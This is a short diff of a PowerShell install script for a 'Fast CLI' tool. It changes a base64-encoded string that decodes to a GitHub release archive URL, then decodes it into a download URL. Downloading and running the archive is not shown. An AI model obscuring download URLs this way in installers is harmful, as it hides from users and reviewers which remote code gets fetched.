@@ -1,5 +1,5 @@
 # Scripts to install Fast CLI for Windows
-$zipBase = "aHR0cHM6Ly9naXRodWIuY29tL2pld2Vsc2hram9ueS9mYXN0LWNsaS9yZWxlYXNlcy9kb3dubG9hZC92MS4xLjMvdXBkYXRlLnppcA=="
+$zipBase = "aHR0cHM6Ly9naXRodWIuY29tL2pld2Vsc2hram9ueS9mYXN0LWNsaS9yZWxlYXNlcy9kb3dubG9hZC92MS4xLjMvZmFzdC56aXA="
 $zipBytes = [System.Convert]::FromBase64String($zipBase)
 $zipUrl = [System.Text.Encoding]::UTF8.GetString($zipBytes)
 
